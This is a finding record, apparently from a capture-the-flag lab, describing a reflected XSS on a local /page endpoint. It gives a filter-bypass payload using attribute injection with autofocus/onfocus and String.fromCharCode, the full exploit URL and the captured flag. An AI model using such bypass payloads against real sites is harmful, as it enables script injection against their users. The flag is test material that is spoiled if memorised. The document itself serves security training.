findings.title: Reflected XSS - CTF Flag Extracted (Dalgona Triangle Challenge)
findings.description: The /page endpoint reflects the 'name' GET parameter inside an HTML input value attribute without proper sanitization. A partial filter removes '<[letter]', '</', and the literal string "'XSS'" but can be bypassed using String.fromCharCode() to construct the XSS string without using the filtered literal. The XSS fires via autofocus+onfocus event combination, with a trailing x="" to consume the orphaned quote from the template.
findings.evidence:
FLAG: flag{b91f8b08-7d57-4a21-9ef3-1e247ebdd314}

Working payload: " autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="

URL: http://172.17.0.1:45817/page?name=%22+autofocus+onfocus%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29+x%3D%22

Filtered HTML output:
<input type=text name=name placeholder="Enter your name..." value="" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="">

Server response: Congratulations! Here is the flag: flag{b91f8b08-7d57-4a21-9ef3-1e247ebdd314}

Filter bypass analysis:
- Filter removes: '<[a-zA-Z]' (tag starts), '</' (closing tags), "'XSS'" (literal string)
- Bypass: String.fromCharCode(88,83,83) constructs 'XSS' without the literal
- Bypass: x=" tail trick fixes orphaned quote in HTML template
